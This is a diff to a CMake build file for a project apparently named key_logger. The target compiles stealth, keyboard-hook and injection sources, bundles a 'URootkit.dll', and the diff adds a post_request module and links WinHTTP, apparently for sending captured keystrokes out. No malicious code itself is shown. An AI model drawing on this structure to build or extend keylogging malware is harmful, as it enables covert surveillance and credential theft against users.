@@ -21,12 +21,14 @@ add_executable (key_logger  "src/main.cpp"
         "src/Stealth.cpp"
         "src/anti_eyes.cpp"
         "src/key_hook.cpp"
-        "include/memory.h"
-        "src/memory.cpp"
+        "include/post_request.h"
+        "src/post_request.cpp"
         "include/inject.h"
         "src/inject.cpp"
         "resources/resources.rc"
-        "resources/URootkit.dll" )
+        "resources/URootkit.dll")
+
+target_link_libraries(key_logger winhttp)
 
 if (CMAKE_VERSION VERSION_GREATER 3.12)
   set_property(TARGET key_logger PROPERTY CXX_STANDARD 20)
